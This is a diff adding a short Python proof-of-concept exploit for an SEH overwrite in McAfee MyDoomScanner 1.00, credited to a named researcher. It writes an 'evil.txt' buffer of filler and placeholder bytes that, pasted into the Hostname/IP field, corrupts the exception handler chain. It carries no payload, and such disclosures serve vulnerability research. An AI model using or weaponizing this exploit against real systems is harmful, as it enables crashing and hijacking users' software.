@@ -1,0 +1,28 @@
+#!/usr/bin/python
+# Exploit Title     : MyDoomScanner1.00 Hostname/IP Field SEH Overwrite POC
+# Discovery by      : Anurag Srivastava
+# Email             : anurag.srivastava@pyramidcyber.com
+# Discovery Date    : 17/08/2017
+# Software Link     : https://www.mcafee.com/in/downloads/free-tools/mydoomscanner.aspx
+# Tested Version    : 1.00
+# Vulnerability Type: SEH Overwrite POC
+# Tested on OS      : Windows XP 
+# Steps to Reproduce: Copy contents of evil.txt file and paste in the Hostname/IP Field. Press ->
+##########################################################################################
+#  -----------------------------------NOTES----------------------------------------------#
+##########################################################################################
+ 
+#SEH chain of main thread
+#Address    SE handler
+#0012FAF8   43434343
+#42424242   *** CORRUPT ENTRY ***
+ 
+# Offset to the SEH Frame is 536
+buffer = "A"*520
+# Address of the Next SEH Frame
+nseh = "B"*4
+# Address to the Handler Code
+seh = "C" *4
+f = open("evil.txt", "wb")
+f.write(buffer+nseh+seh)
+f.close()
